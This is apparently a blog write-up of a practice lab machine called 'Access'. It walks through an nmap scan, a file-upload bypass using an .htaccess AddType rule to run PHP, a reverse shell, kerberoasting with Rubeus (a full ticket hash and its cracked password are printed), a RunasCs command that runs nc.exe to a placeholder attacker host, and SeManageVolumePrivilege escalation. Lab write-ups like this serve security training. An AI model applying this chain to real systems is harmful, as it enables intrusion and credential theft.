+++
date = '2026-02-25T08:26:55+09:00'
draft = false
title = 'Access'
tags = [".htaccess", "RunasCs", "SeManageVolumePrivilege"]
description = 'An attacker achieve initial access by uploading crafted files. After getting the initial shell, other credentials found using kerberoast attack. Finally, An attacker can escalage privilege bu exploiting SeManageVolumePrivilege.'
+++

# Initial foothold

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Access The Event
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-24 01:27:40Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Access The Event
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49789/tcp open  msrpc         Microsoft Windows RPC
```

Ports 80 and 443 are open. Let's start by enumerating the web server.

# Enumeration

## WEB

```bash
whatweb http://192.168.115.187/   
        
http://192.168.115.187/ [200 OK] Apache[2.4.48], Bootstrap, Country[RESERVED][ZZ], Email[info@example.com], Frame, HTML5, HTTPServer[Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7], IP[192.168.115.187], Lightbox, OpenSSL[1.1.1k], PHP[8.0.7], Script, Title[Access The Event]
```

I checked the versions of the web components, but no known vulnerabilities were found for these specific versions.

However, I confirmed that the site is running on an Apache server and is developed in PHP.

Observe functionality of the web.

![upload](/images/access/access-upload.png)

I found a file upload function on the "Buy Tickets" page.

![uploaded](/images/access/access-uploaded.png)

The upload filter can be easily bypassed by changing the extension to `xxx.php.gif`

However, neither a web shell nor a reverse shell would execute.

# Exploitation

Since the target is an Apache server, we can upload a .htaccess file to manipulate server configurations.

For example, a file type can be added like below.

```bash
AddType application/x-httpd-php .gif
```

By adding this line, gif file extension will be treated as php file.

we can even create a new extension.

```bash
AddType application/x-httpd-php .test
```

After uploading the crafted *.htaccess* file, it remains hidden in the uploads directory, but the configuration takes effect.

I uploaded a php revshell to the web site again, and this time managed to get a shell as `svc_apache` user.


# Lateral movement

No *local.txt* flag in svc_apache users' desktop folder.

Tried kerberoast using rubeus and found other credential.

```cmd
rubeus.exe kerberoast /nowrap
```

Rubeus is highly effective for gathering credentials when you have initial access to a target system without cleartext passwords.

```cmd
[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 5/21/2022 5:33:45 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec@access.offsec*$47E98E66E07AE25B066B0D0CCAD15639$87C81FBB98E7F02BBA8AEE760A539F86EFD5B7460DFB9A740109435E935C1577009E8E712A2101CCE112C55AC8EC10F2A12B4DA839ECC8139D05195AA3AE7C91E7B5289759E056CB89F818BF57742A477BA77987ED7EF563C2E4BBDF14D9406A0449ECC330CA4396D9969190F5C84D93359EDEB2FBDD3CFC0B869DBC3877136501E0CB4BAB7A728F3247EB765DD41BCEC9E62F9961CDF1079E0C475BB71F4EB2A68CB8DFAFC5C1E0ACCEEBEBE99051E5957703A24FAD37C3DBD635EFF8722602F9DAB167C61543475E558D7FCD56DA172D7881CECC6854CE755A97916A0DFF98DFA2929AF5E10BA8DC0EB25824CFCA5D7B1B05CCA5D4DBB5AB8FA445220C9A4854F39873E7F497E9CEB824CDF4AF8B47550EB2B134517352B250F5D17CBECEB0E819811B15823BF301DF3B5F675027780FF2C148E2C54923C5A60B2916E6D0BD8070019860C67F8BA68A6FC357359DD2B47790F139DEB801B1F258ECFFE2BC96C3E68833E87D3E29FA956F4BCBB367B04EB43AF6C6FD4C3A6A7A9392594131D738833BCF3E372B516C89C59A0721C0EB7B1CAB03A5677AB2F96E7463E35393B9C995ABE8B85DFCFAD84F67A0B8F2A7033C66D49C0C2EB40E3726C9CEEEEA297F68077B511E194EA7881A2A3B62875E53C508FB48E54FAE67BDB95DA83F75D2E061E260B845E93C2472989A4D512030445CD5C9A896367F59900B78A187205AF9159430A0FDC2F07706B3D6D49F25EF980B9B6CB9CD42E28EFCDB10170EE89940E2996C4DBAC066A5A7D41564AB4DF7B134709BFC96C1D80FBB07FC7993616925C3DDCEA964ECB18E887BA0C2CAC30AE8903FCF9D2DDD8B3E382C0362D358CB33624BDB583C4C6363BB0A7CB04713F9B42AB29C197FCE31B945BDB1231549A6B9206A4AF05B37EB02BF33501084583DAEEA269A21C7E4328E2D488E52590B2BAC2C3E28F70E8E7EA2C65A9C704BCB416C007F823D66B4E1B669CC8CF25AE8F9A1B4FAF004F3C3D80BFA4A2BE5E891CC9BCE645ECC22B135827FC073FDB6E4353DDDD049BDC41DF5A70CD4EF3BA84B3DB4991753B107F346B6ED83FBFDC0950483F95C4AD6F021AE499A8CA1CE2445632844D566FDF7D7513E8E85167CC4CBFAE0F21C8EE7C772E1A742EB0C68D9AD12A064334BAB8FB4FF48BF5CAB6CC4B9DEE9F540C2832125E505D6AB45301E3970D23015812395681A80F8E43D8E1A404E963B9EC32C5BE357EC5DD480998ED8A1018E0DD0AF8B5B446C2920DF7691781B8AD5BCFCC4BF1D9C8D2A50418F140F8B29B10AEFF762A8FFEDC86F19D69A5EBC28D7A451FBEBAE79F50BBF3C09F07D42D4F267091DA4574FB86664A6CCBC10C6B3A6DEEC00FE28B7E229440A5B30008B8349FC953E5FADC0556AEDE06449BB87C275CF9D2C0C05EDFCD12686B516136D921C132E3E64067B58FFCDD9ED3F71EAFC10151C2EA93B4C2D11E0709B1DD994E339056BCED25906EBACAF271A5BC48BD0F7D50EEBB9A2AECB685C376F099D60E6862B7B5696D1A41567DC6FE66254EB1132D5BD5B9BC3BD0331CC5542982194EFBFD4D77CBD5496284B56E7147E21ED33C9E5BCD5C904DBADCFB3620A9237DE3FAE8B
```

After cracking the captured hash, I obtained the password: `trustno1`

I used the *[RunsasCs](https://github.com/antonioCoco/RunasCs/tree/master)* to spawn a shell as the *svc_mssql* user.

```cmd
RunasCs.exe svc_mssql trustno1 "cmd /c C:/Users/public/nc.exe attacker_IP 443 -e cmd" -t 0
```

Execute a reverse shell command as user *svc_mssql*

```cmd
C:\Windows\system32>whoami
whoami
access\svc_mssql
```

# Privilege Escalation

Check svc_mssql's priviliege.

```cmd
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
```

The *SeManageVolumePrivilege* is a well-known privilege escalation vector.

Simply running the tool [SeManageVolumeExploit](https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----2ebc0077b961---------------------------------------), svc_mssql can access all resources like administrator.

For further information gathering, you may transfer sensitive files such as SAM, SYSTEM from system32 folder.